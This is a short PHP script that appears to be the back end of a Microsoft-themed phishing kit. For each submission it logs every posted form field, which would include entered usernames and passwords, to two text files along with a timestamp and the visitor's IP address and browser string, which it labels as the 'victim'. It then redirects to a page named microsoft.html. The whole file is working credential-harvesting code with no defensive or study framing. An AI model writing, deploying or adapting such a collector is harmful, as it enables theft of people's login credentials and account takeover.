<?php
$date = new DateTime("now", new DateTimeZone('Asia/Kolkata'));
$date = $date->format("y:m:d h:i:s");
$raw = fopen('raw.txt', 'a+');
$template=fopen('microsoft.txt','a+');

fwrite($raw, $date);
fwrite($raw, "\n ");
fwrite($template, $date);
fwrite($template, "\n ");

foreach($_POST as $variable => $value) {
   fwrite($raw, $variable);
   fwrite($raw, "=");
   fwrite($raw, $value);
   fwrite($raw, "\r\n");

   fwrite($template, $variable);
   fwrite($template, "=");
   fwrite($template, $value);
   fwrite($template, "\r\n");
}


if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$victim = "IP: ";

fwrite($raw, $victim);
fwrite($raw, $ipaddress);
fwrite($raw, $useragent);
fwrite($raw, $browser);

fwrite($template, $victim);
fwrite($template, $ipaddress);
fwrite($template, $useragent);
fwrite($template, $browser);


fwrite($raw, "\r\n\n");
fwrite($template, "\r\n\n");
fclose($raw);
fclose($template);
header ("Location: microsoft.html");
exit();
